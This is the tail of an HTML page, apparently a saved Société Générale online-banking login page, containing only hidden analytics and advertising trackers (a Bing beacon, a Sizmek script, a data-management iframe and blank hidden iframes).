<div id="interactWrapper" class="sdcwrapper"></div><iframe style="height: 0px; width: 0px; border: 0px none;" id="dmp_bridge_iframe" sandbox="allow-scripts allow-same-origin" src="https://static.societegenerale.fr/pri/static/dmsa/iframe/dmp_bridge.html#console=true&amp;kruxenvname=socgenprod&amp;kruxcontroltagid=Kw6K3cJw&amp;parenthostname=https://particuliers.societegenerale.fr&amp;id=dmp_bridge_iframe" width="0" height="0"></iframe><div style="width:0px; height:0px; display:none; visibility:hidden;" id="batBeacon0.7439465156852985"><img style="width:0px; height:0px; display:none; visibility:hidden;" id="batBeacon0.25338189886423135" alt="" src="https://bat.bing.com/action/0?ti=5500232&amp;Ver=2&amp;mid=4a0c0db8-5e6b-f6de-76b8-b3ee0f677ee2&amp;sid=5eb2f8db-f814-59df-891c-bdb7a9a41372&amp;pi=0&amp;lg=en-US&amp;sw=1482&amp;sh=778&amp;sc=24&amp;tl=Soci%C3%A9t%C3%A9%20G%C3%A9n%C3%A9rale%20%7C%20Connexion&amp;p=https%3A%2F%2Fparticuliers.societegenerale.fr%2Fcom%2Ficd-web%2Fcbo%2Findex.html&amp;r=&amp;lt=3584&amp;evt=pageLoad&amp;msclkid=N&amp;sv=1&amp;rn=190354" width="0" height="0"></div><script type="text/javascript" src="https://bs.serving-sys.com/Serving?cn=ot&amp;onetagid=4932&amp;dispType=js&amp;sync=0&amp;sessionid=6807263960296660162&amp;pageurl=$$https%3A%2F%2Fparticuliers.societegenerale.fr%2Fcom%2Ficd-web%2Fcbo%2Findex.html$$&amp;activityValues=$$Session%3D1660593935673620057$$&amp;acp=$$camp_source_prospect%3Dhttps%3A%2F%2Fparticuliers.societegenerale.fr%2Fcom%2Ficd-web%2Fcbo%2Findex.html$$&amp;ns=0&amp;rnd=28664662821155007" async=""></script><iframe id="iframe843" style="width: 0px; height: 0px; border: medium none; display: none;" src="about:blank" title="hqaosp" frameborder="0"></iframe><iframe id="iframe148" style="width: 0px; height: 0px; border: medium none; display: none;" src="about:blank" title="bdwntq" frameborder="0"></iframe><iframe id="iframe683" style="width: 0px; height: 0px; border: medium none; display: none;" src="about:blank" title="mmfxhx" frameborder="0"></iframe><iframe id="iframe145" style="width: 0px; height: 0px; border: medium none; display: none;" src="about:blank" title="agxgvh" frameborder="0"></iframe></body></html>
